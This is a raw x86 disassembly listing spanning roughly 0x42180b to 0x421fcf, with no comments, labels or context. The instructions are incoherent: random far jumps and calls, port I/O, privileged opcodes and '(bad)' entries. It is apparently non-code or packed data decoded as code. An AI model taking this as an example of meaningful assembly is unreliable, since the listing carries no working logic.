  42180b:	jmp    0x5cf0:0xeef69b47
  421812:	call   0xa84e:0x6a668f46
  421819:	outs   dx,DWORD PTR ds:[esi]
  42181a:	inc    edi
  42181b:	and    ebp,ebx
  42181d:	pop    ebx
  42181e:	fsubr  DWORD PTR [eax+ebp*2]
  421821:	jb     0x4217bc
  421823:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421824:	ins    DWORD PTR es:[edi],dx
  421825:	jmp    0x8b0e2554
  42182a:	retf   0xaa57
  42182d:	jo     0x421885
  42182f:	xchg   ecx,eax
  421830:	loopne 0x42187c
  421832:	sub    cl,BYTE PTR [esi+0x43]
  421835:	push   ebx
  421836:	xor    DWORD PTR [ebx-0x51],ebp
  421839:	push   cs
  42183a:	sbb    ch,ch
  42183c:	je     0x421877
  42183e:	je     0x421846
  421840:	pop    ebx
  421841:	pop    es
  421842:	xor    al,0x3
  421844:	mov    bh,0x83
  421846:	pusha  
  421847:	mov    ebp,0xa19eba52
  42184c:	stos   DWORD PTR es:[edi],eax
  42184d:	ret    0x128e
  421850:	stos   DWORD PTR es:[edi],eax
  421851:	inc    esi
  421852:	in     eax,0x62
  421854:	popa   
  421855:	and    cl,BYTE PTR [ecx+0xc30b3a8]
  42185b:	cmp    BYTE PTR [ecx],0xf
  42185e:	mov    dl,0xaa
  421860:	mov    edi,0xb7e30e87
  421865:	inc    edi
  421866:	sbb    DWORD PTR [esi],ebx
  421868:	mov    ch,0x3b
  42186a:	or     al,0x3d
  42186c:	fdivp  st(4),st
  42186e:	lahf   
  42186f:	fiadd  DWORD PTR [eax+0x72]
  421872:	test   eax,0xa043dc15
  421877:	aaa    
  421878:	mov    bl,0xf7
  42187a:	push   cs
  42187b:	mov    BYTE PTR [edi-0x35a0d6fb],cl
  421881:	inc    esi
  421882:	int3   
  421883:	imul   esp,DWORD PTR [ebx-0x3be617c0],0x10
  42188a:	dec    edi
  42188b:	xchg   ecx,eax
  42188c:	out    0xf8,eax
  42188e:	dec    eax
  42188f:	mov    ebp,0x62c712a9
  421894:	pop    ds
  421895:	icebp  
  421896:	xchg   ebp,eax
  421897:	push   ebp
  421898:	mov    edi,DWORD PTR [ebx+0x22e41085]
  42189e:	sub    ch,bh
  4218a0:	retf   0xec9
  4218a3:	loopne 0x42182d
  4218a5:	xlat   BYTE PTR ds:[ebx]
  4218a6:	push   0x729cdde3
  4218ab:	sub    BYTE PTR [ebp+0x5ae7bfa],cl
  4218b1:	and    BYTE PTR [ebp-0x1ec909c4],dh
  4218b7:	mov    ebx,0x3626e95f
  4218bc:	loopne 0x4218d0
  4218be:	push   eax
  4218bf:	addr16 (bad) 
  4218c1:	or     ebp,DWORD PTR [ebx]
  4218c3:	cmp    DWORD PTR [ebx+0x64],eax
  4218c6:	out    dx,eax
  4218c7:	loop   0x42186b
  4218c9:	call   0x617d75ed
  4218ce:	mov    ch,0x68
  4218d0:	shl    DWORD PTR [bx+0x12],0x9f
  4218d5:	push   esi
  4218d6:	cwde   
  4218d7:	nop
  4218d8:	and    BYTE PTR [esp+ecx*1-0x76],bl
  4218dc:	nop
  4218dd:	lea    edx,[ecx-0x25]
  4218e0:	test   eax,0xc98c1c38
  4218e5:	jl     0x4218cd
  4218e7:	das    
  4218e8:	(bad)  
  4218e9:	fninit 
  4218eb:	call   0xe245c1ec
  4218f0:	inc    esi
  4218f1:	xchg   ecx,eax
  4218f2:	xor    bl,cl
  4218f4:	inc    edi
  4218f5:	mov    eax,0x8647aac
  4218fa:	arpl   bx,cx
  4218fc:	adc    al,0x95
  4218fe:	bound  edx,QWORD PTR [eax+esi*1-0x2422bff2]
  421905:	jne    0x4218cd
  421907:	cmp    eax,0xed6a5bd7
  42190c:	jmp    DWORD PTR [ebx+edi*4-0x3609bc78]
  421913:	popa   
  421914:	retf   
  421915:	int3   
  421916:	shr    BYTE PTR [ebx*8-0x40eb4c08],cl
  42191d:	cs sbb al,0xc3
  421920:	stos   BYTE PTR es:[edi],al
  421921:	leave  
  421922:	sbb    eax,0xc27d2a41
  421927:	loope  0x4218f5
  421929:	jecxz  0x4218ed
  42192b:	and    eax,0x190b6057
  421930:	repz cli 
  421932:	adc    BYTE PTR [ebx+0x49],dl
  421935:	addr16 sti 
  421937:	jmp    0x421940
  421939:	xchg   dl,dl
  42193b:	js     0x421938
  42193d:	add    al,BYTE PTR [ecx]
  42193f:	inc    eax
  421940:	ins    DWORD PTR es:[edi],dx
  421941:	lock cmp bh,BYTE PTR [ebp+0x165e9a8]
  421948:	add    dl,BYTE PTR [edx+0x9a5f783]
  42194e:	in     eax,dx
  42194f:	imul   edi,DWORD PTR [esi+0x2b],0xffffffb0
  421953:	xor    al,0x62
  421955:	sub    BYTE PTR [eax+0xa8a9f62],al
  42195b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42195c:	sub    ax,0x61e0
  421960:	cmp    BYTE PTR [eax],al
  421962:	xchg   ecx,eax
  421963:	jo     0x421989
  421965:	lea    ecx,[ebp-0x7fae6628]
  42196b:	push   cs
  42196c:	inc    ecx
  42196d:	jae    0x42199a
  42196f:	ins    DWORD PTR es:[edi],dx
  421970:	xor    esi,esp
  421972:	mov    ch,0x5b
  421974:	nop    DWORD PTR [esi+ecx*4+0x4]
  421979:	add    cl,BYTE PTR [eax-0x3b]
  42197c:	cmp    DWORD PTR ds:[ebx-0x73b1dd9c],0xffffffb2
  421984:	sub    DWORD PTR [ebx+0x77],edx
  421987:	xchg   ecx,eax
  421988:	call   0xb3d4:0xd92de712
  42198f:	scas   eax,DWORD PTR es:[edi]
  421990:	gs xchg ebp,eax
  421992:	leave  
  421993:	xor    BYTE PTR ds:0x1c2a594b,cl
  421999:	mov    eax,0xa6e25aa0
  42199e:	ficomp DWORD PTR [edi-0x69]
  4219a1:	sub    al,0xac
  4219a3:	xlat   BYTE PTR ds:[ebx]
  4219a4:	hlt    
  4219a5:	pop    edi
  4219a6:	(bad)  
  4219a7:	jne    0x421961
  4219a9:	outs   dx,BYTE PTR ds:[esi]
  4219aa:	xor    eax,0xf4499112
  4219af:	ds cmc 
  4219b1:	sbb    BYTE PTR [ebx-0x2],dl
  4219b4:	add    ebx,edx
  4219b6:	cs or  ah,bh
  4219b9:	jnp    0x421974
  4219bb:	mov    ds:0xc27029b9,eax
  4219c0:	add    dh,BYTE PTR ds:0x4586de85
  4219c6:	add    al,0x9e
  4219c8:	cmp    dh,BYTE PTR [esi-0x18c3b529]
  4219ce:	dec    edx
  4219cf:	pushf  
  4219d0:	pop    ebx
  4219d1:	shr    DWORD PTR [ebx-0x32],0xf7
  4219d5:	add    al,0x97
  4219d7:	or     eax,0xd4838c51
  4219dc:	or     BYTE PTR [esi+eax*2],al
  4219df:	sahf   
  4219e0:	jo     0x421980
  4219e2:	mov    eax,ds:0x7da7d709
  4219e7:	jb     0x42196f
  4219e9:	test   DWORD PTR [esi+0x65881702],esi
  4219ef:	or     eax,0x4c3a2956
  4219f4:	lea    edx,[eax+ecx*4-0x6f7d6729]
  4219fb:	xlat   BYTE PTR ds:[ebx]
  4219fc:	idiv   dl
  4219fe:	pop    ss
  4219ff:	cmp    ebx,eax
  421a01:	dec    ecx
  421a02:	and    BYTE PTR [edi+0x4eabb0b2],0xfb
  421a09:	retf   0x10e0
  421a0c:	cmp    cl,BYTE PTR [ecx]
  421a0e:	fs ds push ss
  421a11:	in     eax,0x85
  421a13:	gs retf 
  421a15:	inc    ecx
  421a16:	mov    edx,0xd1edb14a
  421a1b:	int3   
  421a1c:	inc    ebx
  421a1d:	sbb    BYTE PTR [edi],0x89
  421a20:	push   0xfdf3809
  421a25:	add    ecx,DWORD PTR [edi-0x6a]
  421a28:	lods   al,BYTE PTR ds:[esi]
  421a29:	sub    ch,0xb2
  421a2c:	mov    ebx,DWORD PTR [esi+0x67]
  421a2f:	sub    eax,DWORD PTR [ebx-0x23]
  421a32:	int3   
  421a33:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421a34:	xor    al,0x8b
  421a36:	mov    ds:0x3168880d,al
  421a3b:	dec    esp
  421a3c:	pop    ecx
  421a3d:	cmc    
  421a3e:	jno    0x421a64
  421a40:	cmp    eax,esi
  421a42:	js     0x421a48
  421a44:	add    al,0xac
  421a46:	arpl   WORD PTR [esi-0x54],bx
  421a49:	xor    edx,DWORD PTR [edx+0x4ed0f1c6]
  421a4f:	or     al,0x4a
  421a51:	lds    ecx,FWORD PTR [edi+edx*8+0x4ed1cb4a]
  421a58:	pop    ss
  421a59:	in     eax,dx
  421a5a:	push   ebp
  421a5b:	enter  0x54a6,0x67
  421a5f:	sbb    bh,bl
  421a61:	sbb    eax,0xfb922c3a
  421a66:	jmp    FWORD PTR [ebp+0x42b30eed]
  421a6c:	xor    BYTE PTR [ecx],al
  421a6e:	mov    BYTE PTR [esi],dl
  421a70:	loopne 0x421a2a
  421a72:	mov    al,0x4e
  421a74:	outs   dx,BYTE PTR ds:[esi]
  421a75:	jl     0x421a20
  421a77:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421a78:	xor    eax,0x488ab961
  421a7d:	jmp    0x421ada
  421a7f:	jmp    0xc1fa5305
  421a84:	adc    edx,esi
  421a86:	jmp    DWORD PTR [ebp+0x16d520d4]
  421a8c:	dec    edi
  421a8d:	outs   dx,BYTE PTR ds:[esi]
  421a8e:	fnstcw WORD PTR [ebp+0x3]
  421a91:	pop    ebx
  421a92:	pop    esi
  421a93:	cmp    eax,0x9a460765
  421a98:	ret    0x397c
  421a9b:	adc    al,0x55
  421a9d:	xor    al,0x48
  421a9f:	ss xchg edx,eax
  421aa1:	call   0x9bb8:0xf4d7c1aa
  421aa8:	add    DWORD PTR [edi+esi*4],esi
  421aab:	xchg   BYTE PTR [edi],bh
  421aad:	mov    ch,0x1a
  421aaf:	ds test dh,cl
  421ab2:	mov    dl,0xf2
  421ab4:	xchg   esi,eax
  421ab6:	push   edx
  421ab7:	shl    DWORD PTR [esp+esi*2-0x20],0xf
  421abc:	out    dx,eax
  421abd:	mov    cl,0xc7
  421abf:	mov    eax,ss
  421ac1:	pop    edi
  421ac2:	sub    eax,0x8dfea1dd
  421ac7:	stos   DWORD PTR es:[edi],eax
  421ac8:	xchg   ecx,eax
  421ac9:	addr16 sbb al,0x7b
  421acc:	and    BYTE PTR [ebx-0x7f124942],dl
  421ad2:	dec    eax
  421ad3:	ret    
  421ad4:	(bad)  
  421ad5:	daa    
  421ad6:	push   eax
  421ad7:	pop    ebx
  421ad8:	(bad)  
  421ad9:	xchg   ebx,eax
  421ada:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421adb:	rol    BYTE PTR [edx*4-0x12b82755],1
  421ae2:	xchg   ecx,eax
  421ae3:	xchg   edi,eax
  421ae4:	inc    eax
  421ae5:	sbb    ecx,DWORD PTR [ecx+0x7a61e5f8]
  421aeb:	(bad)  
  421aec:	cmp    DWORD PTR [edx],ecx
  421aee:	shl    DWORD PTR [eax],1
  421af0:	adc    BYTE PTR [edi+edi*1+0x24648ee2],ah
  421af7:	or     eax,0x8b4a483b
  421afc:	and    bh,ah
  421afe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421aff:	sub    al,BYTE PTR [edi-0x5b]
  421b02:	dec    edi
  421b03:	outs   dx,DWORD PTR ds:[esi]
  421b04:	js     0x421a8c
  421b06:	lds    esp,FWORD PTR [edi+ebp*8]
  421b09:	jg     0x421b2b
  421b0b:	mov    esi,0x17b6bd11
  421b10:	outs   dx,DWORD PTR ds:[esi]
  421b11:	dec    esi
  421b12:	fwait
  421b13:	push   ebx
  421b14:	cmc    
  421b15:	inc    edx
  421b16:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421b17:	jmp    0x421b88
  421b19:	xchg   ecx,eax
  421b1a:	mov    ecx,0xa8bc2c9f
  421b1f:	iret   
  421b20:	mov    eax,0xd1aed8eb
  421b25:	dec    edi
  421b26:	les    ebx,FWORD PTR [ebp+0x79]
  421b29:	inc    esp
  421b2a:	sub    BYTE PTR [ebx-0x1c],cl
  421b2d:	test   ebx,edx
  421b2f:	lods   eax,DWORD PTR ds:[esi]
  421b30:	dec    eax
  421b31:	adc    BYTE PTR [esi-0x69d38261],al
  421b37:	inc    esp
  421b38:	in     eax,dx
  421b39:	or     ch,ah
  421b3b:	test   DWORD PTR [esi+0x65c42f1c],ebx
  421b41:	inc    ebx
  421b42:	and    eax,0xbae026b2
  421b47:	imul   esp,DWORD PTR [eax],0xc388210
  421b4d:	mov    dh,0xb7
  421b4f:	pop    eax
  421b50:	mov    WORD PTR [edx],?
  421b52:	xor    BYTE PTR [edi+0x74862cba],al
  421b58:	cmp    eax,DWORD PTR [eax+ecx*8-0x5858405f]
  421b5f:	jge    0x421b5b
  421b61:	adc    eax,0x69444142
  421b66:	mov    BYTE PTR [ebx],bl
  421b68:	push   0x622f68da
  421b6d:	lahf   
  421b6e:	or     DWORD PTR [eax+0x75],ecx
  421b71:	xor    al,0x8c
  421b73:	xchg   edx,esi
  421b75:	arpl   WORD PTR ds:[eax-0x58],sp
  421b79:	(bad)  
  421b7a:	fld    TBYTE PTR [esi*1-0x77dce13e]
  421b81:	or     BYTE PTR [edx+0x29],0x6
  421b85:	test   BYTE PTR [ebx+0x17190ec2],0x60
  421b8c:	xchg   BYTE PTR [esp+ecx*8],ch
  421b8f:	adc    DWORD PTR [ecx-0xf744d0b],edx
  421b95:	hlt    
  421b96:	adc    ebp,esi
  421b98:	xchg   esp,eax
  421b99:	fld    QWORD PTR [edx+0x66]
  421b9c:	mov    al,ds:0x0
  421ba1:	add    BYTE PTR [ebx],bl
  421ba3:	mov    esi,0xdaef9aee
  421ba8:	jg     0x421b69
  421baa:	call   0x6994:0xe8770da0
  421bb1:	jge    0x421c31
  421bb3:	xchg   ebp,eax
  421bb4:	add    DWORD PTR [eax],eax
  421bb6:	repz add al,0x0
  421bb9:	add    BYTE PTR [edx-0x555719c],ch
  421bbf:	rol    BYTE PTR [edi+0x247005a0],1
  421bc5:	out    dx,eax
  421bc6:	cmp    eax,0x9a2fcc00
  421bcb:	in     al,dx
  421bcc:	mov    WORD PTR [ecx-0x6d],?
  421bcf:	rcl    BYTE PTR [esp+esi*4],0x98
  421bd3:	mov    ?,WORD PTR [edx+0x575de27a]
  421bd9:	xchg   al,dh
  421bdb:	ins    DWORD PTR es:[edi],dx
  421bdc:	sti    
  421bdd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421bde:	pop    ecx
  421bdf:	loop   0x421c42
  421be1:	clc    
  421be2:	mov    ch,0xcd
  421be4:	loope  0x421bdd
  421be6:	mov    eax,0xb72491fc
  421beb:	dec    ebx
  421bec:	in     al,dx
  421bed:	aaa    
  421bee:	mov    ss,WORD PTR [edx-0x3df35114]
  421bf4:	iret   
  421bf5:	add    ch,cl
  421bf7:	jns    0x421c65
  421bf9:	test   DWORD PTR [ebx-0x1b3be490],ebx
  421bff:	loop   0x421bb4
  421c01:	aad    0x15
  421c03:	ja     0x421baf
  421c05:	adc    ecx,DWORD PTR [esi]
  421c07:	ret    0x62d1
  421c0a:	inc    ebx
  421c0b:	dec    esp
  421c0c:	sbb    al,0x1d
  421c0e:	sub    al,0x20
  421c10:	mov    cl,0x7c
  421c12:	xor    al,0x31
  421c14:	or     ebx,DWORD PTR [esp+ebx*4-0x16]
  421c18:	aam    0xd
  421c1a:	push   cs
  421c1b:	rol    bl,cl
  421c1d:	fnstcw WORD PTR [edx-0x41]
  421c20:	jo     0x421c18
  421c22:	div    BYTE PTR [ebx-0x5767ad80]
  421c28:	add    eax,0x8f26e655
  421c2d:	sub    al,0xbc
  421c2f:	dec    ebp
  421c30:	and    edx,DWORD PTR [ebp-0x14]
  421c33:	jnp    0x421be2
  421c35:	dec    ebx
  421c36:	pop    ebx
  421c37:	pop    esi
  421c38:	and    ebx,DWORD PTR [esi+0x451fc82e]
  421c3e:	dec    edi
  421c3f:	cmc    
  421c40:	pop    edx
  421c41:	push   DWORD PTR [edi+0x4afd5ce8]
  421c47:	adc    bl,BYTE PTR [ebx]
  421c49:	pop    ds
  421c4a:	lahf   
  421c4b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421c4c:	mov    bh,0xfb
  421c4e:	in     eax,dx
  421c4f:	add    BYTE PTR [ecx+0x42],ah
  421c52:	push   ebx
  421c53:	retf   
  421c54:	jbe    0x421cd5
  421c56:	push   edx
  421c57:	cmp    dh,ch
  421c59:	cmp    BYTE PTR [edi+0x34],ch
  421c5c:	sub    ch,BYTE PTR [esi+ebx*4+0x74cfbab7]
  421c63:	xchg   esi,eax
  421c64:	add    DWORD PTR [ebx-0x37628fc],eax
  421c6a:	mov    bl,0x59
  421c6c:	ds mov dl,0x75
  421c6f:	mov    dl,0xff
  421c71:	pop    edx
  421c72:	sbb    eax,DWORD PTR [ecx-0x6517b306]
  421c78:	out    0x8a,al
  421c7a:	stos   DWORD PTR es:[di],eax
  421c7c:	int    0x15
  421c7e:	xor    edx,DWORD PTR [edi]
  421c80:	jo     0x421c4a
  421c82:	and    ecx,DWORD PTR [edx]
  421c84:	add    DWORD PTR [edx-0x5c],0xffffffd4
  421c88:	add    DWORD PTR [esi+0x7f],esi
  421c8b:	cmp    DWORD PTR [ebx+0x4744de0e],edi
  421c91:	fadd   st,st(6)
  421c93:	mov    al,0x49
  421c95:	sub    al,0xe0
  421c97:	lea    ebp,[esi+0x5a]
  421c9a:	push   esi
  421c9b:	into   
  421c9c:	clc    
  421c9d:	stos   DWORD PTR es:[edi],eax
  421c9e:	jae    0x421cec
  421ca0:	fsubr  st(0),st
  421ca2:	sub    eax,0xea79b581
  421ca7:	popf   
  421ca8:	adc    cl,BYTE PTR [ecx]
  421caa:	mov    cl,BYTE PTR [esi+0x5e]
  421cad:	repz out dx,al
  421caf:	repz jl 0x421c76
  421cb2:	adc    al,0x10
  421cb4:	pop    ebp
  421cb5:	gs cmc 
  421cb7:	cs mov ch,0x5
  421cba:	call   0x4263:0x689b531a
  421cc1:	xor    DWORD PTR [edi-0x16f1beff],esi
  421cc7:	push   esi
  421cc8:	mov    BYTE PTR [ebx+edi*1+0x6f],bl
  421ccc:	adc    BYTE PTR [ebx-0x73323c11],ch
  421cd2:	jg     0x421c9a
  421cd4:	pushf  
  421cd5:	loopne 0x421d34
  421cd7:	mov    al,0x36
  421cd9:	loopne 0x421d3e
  421cdb:	in     eax,0x59
  421cdd:	jb     0x421c9d
  421cdf:	inc    esp
  421ce0:	in     al,dx
  421ce1:	push   0xb3e66891
  421ce6:	cwde   
  421ce7:	(bad)  
  421ce8:	int    0xab
  421cea:	jns    0x421c6d
  421cec:	or     dl,ah
  421cee:	jl     0x421c92
  421cf0:	mov    esi,0x816a457e
  421cf5:	test   BYTE PTR [ebx-0x71],bl
  421cf8:	fld    QWORD PTR [eax+0x88bc5de]
  421cfe:	dec    ebx
  421cff:	das    
  421d00:	popa   
  421d01:	fs out dx,al
  421d03:	and    al,0xb4
  421d05:	nop    DWORD PTR [esp+ebp*8]
  421d09:	pop    esi
  421d0a:	das    
  421d0b:	std    
  421d0c:	in     eax,0xbc
  421d0e:	dec    ebx
  421d0f:	cmc    
  421d10:	pop    ss
  421d11:	(bad)  
  421d12:	les    ebp,FWORD PTR [edi-0x754a8672]
  421d18:	scas   eax,DWORD PTR es:[edi]
  421d19:	shr    BYTE PTR [esi-0x1f37cb1c],cl
  421d1f:	imul   edx,eax,0x815a7f72
  421d25:	comiss xmm4,DWORD PTR [esi+0x179c9003]
  421d2c:	push   ds
  421d2d:	xchg   ebx,eax
  421d2e:	aam    0x64
  421d30:	mov    ds:0xdcbce78f,eax
  421d35:	frstpm(287 only) 
  421d37:	pop    ss
  421d38:	mov    esp,0x3c98aae4
  421d3d:	adc    dl,bh
  421d3f:	out    0x1c,eax
  421d41:	aaa    
  421d42:	fwait
  421d43:	push   cs
  421d44:	dec    edx
  421d45:	jmp    0x421cdb
  421d47:	lea    ebx,[edx]
  421d49:	lods   al,BYTE PTR ds:[esi]
  421d4a:	add    esp,DWORD PTR [eax]
  421d4c:	sbb    dl,BYTE PTR [ebx-0x3d]
  421d4f:	or     ebp,DWORD PTR [esi]
  421d51:	and    ecx,ebp
  421d53:	std    
  421d54:	mov    ebp,0xeef31851
  421d59:	push   es
  421d5a:	neg    DWORD PTR [edx+0x3cc66f67]
  421d60:	mov    ds:0x507539a8,al
  421d65:	sbb    dl,BYTE PTR [ebx+0x66]
  421d68:	xchg   esp,eax
  421d69:	mov    gs,WORD PTR [eax-0x54]
  421d6c:	mov    dh,0x0
  421d6e:	pushf  
  421d6f:	fcmovne st,st(5)
  421d71:	pushf  
  421d72:	push   0x61
  421d74:	dec    edx
  421d75:	(bad)  
  421d76:	push   ebx
  421d77:	pop    ecx
  421d78:	(bad)  
  421d79:	pusha  
  421d7a:	push   0x58c4d516
  421d7f:	push   cs
  421d80:	mov    ds:0xfae29895,eax
  421d85:	mov    ebx,DWORD PTR [ecx-0x18a451d8]
  421d8b:	mov    esp,0x1ead0f39
  421d90:	adc    eax,DWORD PTR [edx]
  421d92:	jp     0x421dd4
  421d94:	push   ebx
  421d95:	push   esi
  421d96:	idiv   ecx
  421d98:	ins    DWORD PTR es:[edi],dx
  421d99:	ja     0x421da4
  421d9b:	ret    0x571d
  421d9e:	sbb    eax,0xf0f2ca7c
  421da3:	fsubr  QWORD PTR [edx]
  421da5:	add    DWORD PTR [ecx],ebx
  421da7:	jae    0x421dda
  421da9:	mov    ecx,esi
  421dab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421dac:	cwde   
  421dad:	pop    eax
  421dae:	(bad)  
  421daf:	loope  0x421d35
  421db1:	mov    dh,0x59
  421db3:	call   0x5006:0x6e1917b4
  421dba:	pop    ss
  421dbb:	xchg   ecx,edi
  421dbd:	jmp    0x402a:0x6cd9948a
  421dc4:	loop   0x421e24
  421dc6:	les    edi,FWORD PTR [eax+0x3be53f79]
  421dcc:	pushf  
  421dcd:	xor    al,0x55
  421dcf:	iret   
  421dd0:	stc    
  421dd1:	xchg   edx,eax
  421dd2:	xor    eax,0xaa4f6613
  421dd7:	sysexit 
  421dd9:	fadd   QWORD PTR [esi+0x6ea766e]
  421ddf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421de0:	pushf  
  421de1:	(bad)  
  421de2:	mov    dh,0x4f
  421de4:	dec    eax
  421de5:	xor    DWORD PTR [edi],ecx
  421de7:	jnp    0x421d82
  421de9:	in     eax,dx
  421dea:	cmp    al,0x55
  421dec:	dec    esp
  421ded:	sub    al,0xce
  421def:	sbb    eax,0xe9440fef
  421df4:	mov    eax,0x74bc537e
  421df9:	mov    edi,0x2141ff49
  421dfe:	and    al,0x67
  421e00:	inc    edi
  421e01:	fst    st(7)
  421e03:	cmp    eax,0xd3a60ed2
  421e08:	jb     0x421db3
  421e0a:	mov    ds:0x23fd3c6a,eax
  421e0f:	icebp  
  421e10:	scas   al,BYTE PTR es:[edi]
  421e11:	mov    eax,ds:0x8ce04494
  421e16:	int3   
  421e17:	xor    al,0x6d
  421e19:	jp     0x421e69
  421e1b:	dec    eax
  421e1c:	xchg   edi,eax
  421e1d:	ret    
  421e1e:	xlat   BYTE PTR ds:[ebx]
  421e1f:	loop   0x421da7
  421e21:	daa    
  421e22:	fs into 
  421e24:	sbb    eax,0xd0951779
  421e29:	outs   dx,BYTE PTR ds:[esi]
  421e2a:	cmp    BYTE PTR [eax+0xd],bl
  421e2d:	push   ss
  421e2e:	sbb    ecx,DWORD PTR [edi]
  421e30:	mov    dh,0x9f
  421e32:	shl    bh,0x59
  421e35:	fs in  al,0xe3
  421e38:	sub    eax,0x35046f1d
  421e3d:	lods   eax,DWORD PTR ds:[esi]
  421e3e:	bound  ecx,QWORD PTR [esi]
  421e40:	repnz cmp esp,edi
  421e43:	in     eax,dx
  421e44:	mov    ch,0x19
  421e46:	or     ebp,DWORD PTR [edi+0x71b367e]
  421e4c:	shl    DWORD PTR [eax],0x1
  421e4f:	das    
  421e50:	(bad)  
  421e51:	cld    
  421e52:	dec    ebp
  421e53:	leave  
  421e54:	nop
  421e55:	iret   
  421e56:	pop    ebx
  421e57:	rcr    BYTE PTR [edx-0x80],cl
  421e5a:	mov    WORD PTR [ebx+edi*8-0x38],es
  421e5e:	mov    ecx,0x1ab38d86
  421e63:	jmp    0xdd55:0x1f53ba3f
  421e6a:	push   cs
  421e6b:	push   edx
  421e6c:	lods   al,BYTE PTR ds:[esi]
  421e6d:	sti    
  421e6e:	bnd jge 0x421e2d
  421e71:	push   ebp
  421e72:	leave  
  421e73:	out    0x4f,al
  421e75:	inc    BYTE PTR [edi]
  421e77:	je     0x421dfc
  421e79:	call   0x9e98:0x37c3e44e
  421e80:	aaa    
  421e81:	xlat   BYTE PTR ds:[ebx]
  421e82:	sub    eax,0xd1f0f6a6
  421e87:	mov    al,0x71
  421e89:	adc    eax,0x639eb85
  421e8e:	xchg   ebp,eax
  421e8f:	sti    
  421e90:	push   gs
  421e92:	lds    ebp,FWORD PTR [ecx]
  421e94:	in     al,dx
  421e95:	ins    DWORD PTR es:[edi],dx
  421e96:	jmp    0x40ae:0x4218d33b
  421e9d:	push   ds
  421e9e:	dec    esp
  421e9f:	sub    DWORD PTR [eax],edi
  421ea1:	mov    edi,0xe0f196ee
  421ea6:	test   al,0x2f
  421ea8:	mov    al,ds:0xdc0e9017
  421ead:	mov    esp,0xefa43577
  421eb2:	xchg   DWORD PTR [eax+0x4f5a7f82],edi
  421eb8:	mov    ?,esp
  421eba:	push   ds
  421ebb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421ebc:	(bad)  [esi-0xfa898d]
  421ec2:	mov    dl,0xce
  421ec4:	aas    
  421ec5:	mov    edx,0xa56cbaec
  421eca:	mov    bh,0xe9
  421ecc:	(bad)  
  421ecd:	aas    
  421ece:	pop    es
  421ecf:	and    BYTE PTR [ebx-0x22],bl
  421ed2:	push   eax
  421ed3:	mov    edi,0x798b97d1
  421ed8:	cld    
  421ed9:	jo     0x421e5e
  421edb:	push   ds
  421edc:	cmp    dh,bh
  421ede:	(bad)  [ebx-0x60]
  421ee1:	sub    eax,0x8b1e2b52
  421ee6:	sti    
  421ee7:	das    
  421ee8:	sbb    eax,0xe935c968
  421eed:	cmp    DWORD PTR [edi+0x7d49451],0x959e747e
  421ef7:	enter  0xa3fd,0xd8
  421efb:	mov    edx,0xe0b655a
  421f00:	push   0xfb8b1dcb
  421f05:	dec    ecx
  421f06:	cmp    eax,0xe01e4c97
  421f0b:	xor    al,0xcd
  421f0d:	hlt    
  421f0e:	jae    0x421ec1
  421f10:	shufps xmm3,XMMWORD PTR [ebp+0x22dfea61],0x4a
  421f18:	dec    esp
  421f19:	iret   
  421f1a:	stos   BYTE PTR es:[edi],al
  421f1b:	xchg   BYTE PTR [ebp-0x6b84fb3b],bh
  421f21:	and    ah,bh
  421f23:	imul   BYTE PTR [eax-0x6a0fea09]
  421f29:	or     ecx,esp
  421f2b:	mov    ds:0xbbf2f7ff,eax
  421f30:	mov    eax,0x43823d37
  421f35:	jecxz  0x421fb1
  421f37:	sbb    eax,0xa8ce4644
  421f3c:	or     DWORD PTR [eax-0x7203287f],eax
  421f42:	cwde   
  421f43:	outs   dx,DWORD PTR ds:[esi]
  421f44:	push   edi
  421f45:	dec    eax
  421f46:	fimul  DWORD PTR ss:[ebx+edi*1]
  421f4a:	dec    ecx
  421f4b:	jnp    0x421f29
  421f4d:	fwait
  421f4e:	ror    DWORD PTR [esi+0x1949d3f5],cl
  421f54:	mov    BYTE PTR [edx+eax*4+0x21],ah
  421f58:	rol    BYTE PTR [esi+0x16],cl
  421f5b:	call   0x731a:0xc124bb8d
  421f62:	and    eax,DWORD PTR [eax]
  421f64:	sub    edx,DWORD PTR [ebx-0x1eabba6c]
  421f6a:	sahf   
  421f6b:	aaa    
  421f6c:	sti    
  421f6d:	xchg   edx,eax
  421f6e:	add    eax,DWORD PTR [esi-0x7788c754]
  421f74:	cmp    eax,DWORD PTR [edi-0x6655a642]
  421f7a:	xchg   edx,eax
  421f7b:	dec    esp
  421f7c:	shl    DWORD PTR [ecx+0x47],cl
  421f7f:	sub    eax,edx
  421f81:	push   ecx
  421f82:	js     0x421fe1
  421f84:	aaa    
  421f85:	ja     0x421f8f
  421f87:	adc    edi,edx
  421f89:	mov    esi,0x3a747d58
  421f8e:	jl     0x421fbb
  421f90:	das    
  421f91:	shl    DWORD PTR [eax],1
  421f93:	(bad)  
  421f94:	xchg   ecx,eax
  421f95:	xor    BYTE PTR [edx-0x54],ah
  421f98:	pop    esp
  421f99:	ins    DWORD PTR es:[edi],dx
  421f9a:	pop    ecx
  421f9b:	loopne 0x422010
  421f9d:	js     0x421fb8
  421f9f:	dec    edx
  421fa0:	(bad)  
  421fa1:	loope  0x421f9d
  421fa3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421fa4:	(bad)  
  421fa5:	sbb    eax,0xc9405bed
  421faa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421fab:	inc    ebx
  421fac:	cmp    al,0xd9
  421fae:	sub    BYTE PTR [ecx-0x6d8ebc13],cl
  421fb4:	lods   eax,DWORD PTR ds:[esi]
  421fb5:	xlat   BYTE PTR ds:[ebx]
  421fb6:	test   al,0x32
  421fb8:	and    BYTE PTR [eax+0x23d890d8],0x3e
  421fbf:	mov    cl,0x4c
  421fc1:	rcl    cl,cl
  421fc3:	mov    dh,0x89
  421fc5:	in     al,0x48
  421fc7:	inc    edx
  421fc8:	jnp    0x421f69
  421fca:	sub    DWORD PTR [ebp+ebx*4-0x5e],0xffffff9d
  421fcf:	inc    edx
